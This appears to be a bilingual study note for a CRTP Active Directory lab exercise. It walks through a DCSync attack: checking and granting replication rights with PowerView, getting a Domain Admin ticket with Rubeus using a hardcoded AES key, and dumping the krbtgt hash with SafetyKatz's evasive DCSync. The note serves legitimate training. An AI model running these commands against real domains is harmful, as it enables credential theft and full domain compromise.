# Learning Objetive 12

* Attack that can be executed with Replication rights (no DA privileges required)

***

* Check if studentx has Replication (DCSync) rights.
* If yes, execute the DCSync attack to pull hashes of the krbtgt user.
* If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.

***

> * Obtener el hash de **krbtgt** (necesario para crear Golden Tickets) usando **DCSync**.
> * DCSync requiere **derechos de replicación** (Replication rights) en el dominio (específicamente en el objeto raíz: DC=dollarcorp,DC=moneycorp,DC=local).

## Check if studentx has Replication (DCSync) rights

Has replication rights using the following command -->

> It into administrative privileges cmd

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
```

> Remenber change the student113

If the studentx does not have replication rights, let’s add the rights.

Start a process as Domain Administrator by running the below command from an elevated command prompt:

### If it havent, add the replication rights

Start a process as Domain Administrator by running the below command from an elevated command prompt:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Run the below commands in the new process.

> Remember to change studentx pharafe to your user:
>
> All it, excute into the new cmd opened

```
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
. C:\AD\Tools\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student113 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

<figure><img src="../../../../.gitbook/assets/image (1438).png" alt=""><figcaption></figcaption></figure>

#### Chech again

Let’s check for the rights once again from a normal shell:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student113"}
```

> Remeber change the student113

<figure><img src="../../../../.gitbook/assets/image (1439).png" alt=""><figcaption></figcaption></figure>

Sweet! Now, below command (or any similar tool) can be used as `studentx` to get the hashes of `krbtgt` user or any other user:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

<figure><img src="../../../../.gitbook/assets/image (1440).png" alt=""><figcaption></figcaption></figure>

***

#### ¿Por qué es DCSync?

* **DCSync** es el ataque que **imita** a un Domain Controller replicando datos del dominio.
* Para ejecutarlo, **solo necesitas** los derechos específicos de replicación en el objeto raíz del dominio (DC=...):
  * DS-Replication-Get-Changes
  * DS-Replication-Get-Changes-All
  * DS-Replication-Get-Changes-In-Filtered-Set
* Estos derechos **no requieren** que seas Domain Admin completo.
* Puedes tenerlos si:
  * Te los añadieron (como hiciste en el ejercicio con Add-DomainObjectAcl).
  * O si el usuario ya los tenía delegados (por ejemplo, un operador de replicación o un usuario con derechos mal configurados).
* Con **solo** estos derechos puedes:
  * Extraer el hash de **krbtgt** (y de cualquier otro usuario).
  * Crear **Golden Tickets** después.
  * Hacer **DCSync** remotamente (como hiciste con SafetyKatz: lsadump::evasive-dcsync /user:dcorp\krbtgt).

#### Ataques que **SÍ requieren DA** (para que compares y no te confundas)

* Resetear contraseña del DSRM (LO11) → necesita DA o Write Property en el DC.
* Crear Golden Ticket directamente → necesitas el hash de krbtgt (que obtienes con DCSync).
* Añadirte a grupos protegidos (como Domain Admins) → necesita DA o GenericAll.
* Modificar ACLs arbitrarios → necesita DA o Write DACL.

#### Ataques que **NO requieren DA** (solo Replication rights)

* **DCSync** → el único que realmente puedes hacer con **solo** estos derechos.
* (Algunos abusos muy específicos de ACLs delegados, pero en CRTP el principal es DCSync).
